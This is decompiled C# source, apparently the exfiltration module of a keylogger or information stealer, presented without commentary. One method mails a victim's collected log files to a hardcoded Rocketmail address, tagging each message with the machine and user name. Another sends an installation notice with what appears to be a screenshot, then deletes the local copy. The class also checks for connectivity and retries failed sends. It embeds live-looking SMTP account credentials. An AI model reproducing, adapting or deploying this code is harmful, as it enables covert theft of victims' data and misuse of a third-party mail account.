using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Threading;

public class GClass5
{
	public const string string_0 = "paradisejohn@rocketmail.com";

	public const string string_1 = "pop.mail.yahoo.com";

	public const string string_2 = "smtp.mail.yahoo.com.br";

	public const string string_3 = "@onn2@onn2";

	private string string_4;

	private EventHandler eventHandler_0;

	public event EventHandler Event_0
	{
		add
		{
			EventHandler eventHandler = eventHandler_0;
			EventHandler eventHandler2;
			do
			{
				eventHandler2 = eventHandler;
				EventHandler value2 = (EventHandler)Delegate.Combine(eventHandler2, value);
				eventHandler = Interlocked.CompareExchange(ref eventHandler_0, value2, eventHandler2);
			}
			while ((object)eventHandler != eventHandler2);
		}
		remove
		{
			EventHandler eventHandler = eventHandler_0;
			EventHandler eventHandler2;
			do
			{
				eventHandler2 = eventHandler;
				EventHandler value2 = (EventHandler)Delegate.Remove(eventHandler2, value);
				eventHandler = Interlocked.CompareExchange(ref eventHandler_0, value2, eventHandler2);
			}
			while ((object)eventHandler != eventHandler2);
		}
	}

	public GClass5()
	{
	}

	public GClass5(string storeDataFile_)
	{
		string_4 = storeDataFile_;
	}

	public void method_0()
	{
		MailMessage mailMessage = new MailMessage();
		mailMessage.To.Add("paradisejohn@rocketmail.com");
		DateTime now = DateTime.Now;
		mailMessage.Subject = "Logs - " + Environment.MachineName + "\\" + Environment.UserName + " " + now;
		mailMessage.From = new MailAddress("paradisejohn@rocketmail.com");
		new GClass10();
		string[] files = Directory.GetFiles(Path.GetDirectoryName(string_4));
		if (files.Length > 1)
		{
			string[] array = files;
			foreach (string text in array)
			{
				if (string.Compare(Path.GetFileName(text), Path.GetFileName(GClass9.String_2)) != 0)
				{
					try
					{
						mailMessage.Attachments.Add(new Attachment(text));
					}
					catch
					{
						return;
					}
				}
			}
		}
		else
		{
			try
			{
				mailMessage.Attachments.Add(new Attachment(string_4));
			}
			catch
			{
				return;
			}
		}
		SmtpClient smtpClient = new SmtpClient("smtp.mail.yahoo.com.br");
		NetworkCredential networkCredential = (NetworkCredential)(smtpClient.Credentials = new NetworkCredential("paradisejohn@rocketmail.com", "@onn2@onn2"));
		int num = 0;
		while (num != 5)
		{
			try
			{
				smtpClient.Timeout = 30000;
				smtpClient.Send(mailMessage);
				mailMessage.Dispose();
				num = 5;
				if (eventHandler_0 != null)
				{
					eventHandler_0(null, null);
				}
			}
			catch
			{
				num++;
				Thread.Sleep(1000);
			}
		}
	}

	public void method_1()
	{
		if (!method_2())
		{
			return;
		}
		MailMessage mailMessage = new MailMessage();
		mailMessage.To.Add("paradisejohn@rocketmail.com");
		DateTime now = DateTime.Now;
		mailMessage.Subject = "Mtrl has been installed on \"" + Environment.MachineName + "\\" + Environment.UserName + "\" at  " + now;
		mailMessage.From = new MailAddress("paradisejohn@rocketmail.com");
		string text = Guid.NewGuid().ToString();
		string tempPath = Path.GetTempPath();
		string text2 = Path.Combine(tempPath, text + ".jpg");
		if (GClass3.smethod_0(text, tempPath) && File.Exists(text2))
		{
			mailMessage.Attachments.Add(new Attachment(text2));
		}
		SmtpClient smtpClient = new SmtpClient("smtp.mail.yahoo.com.br");
		NetworkCredential networkCredential = (NetworkCredential)(smtpClient.Credentials = new NetworkCredential("paradisejohn@rocketmail.com", "@onn2@onn2"));
		int num = 0;
		while (num != 5)
		{
			try
			{
				smtpClient.Timeout = 30000;
				smtpClient.Send(mailMessage);
				mailMessage.Dispose();
				num = 5;
			}
			catch
			{
				num++;
				Thread.Sleep(1000);
			}
		}
		try
		{
			GClass2.smethod_0(text2);
		}
		catch
		{
		}
	}

	public bool method_2()
	{
		try
		{
			TcpClient tcpClient = new TcpClient("www.google.com", 80);
			tcpClient.Close();
			return true;
		}
		catch
		{
			return false;
		}
	}
}
